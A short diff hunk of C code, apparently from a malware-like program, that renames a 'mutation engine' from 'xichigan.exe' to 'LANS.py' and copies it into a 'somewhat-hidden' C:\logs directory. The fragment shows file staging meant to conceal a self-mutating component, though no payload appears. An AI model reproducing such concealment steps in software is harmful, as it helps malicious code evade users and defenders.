@@ -76,12 +76,12 @@ int main(void)
 	}
 	
 	//Move mutation engine to somewhat-hidden directory
-	strcpy(src, "xichigan.exe");
+	strcpy(src, "LANS.py");
 	strcpy(dest, "C:\\logs");
 	
 	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
-		strcat(dest, "\\xichigan.exe");
+		strcat(dest, "\\LANS.py");
 		copyBinaryFile(src, dest);
 	}
 	else
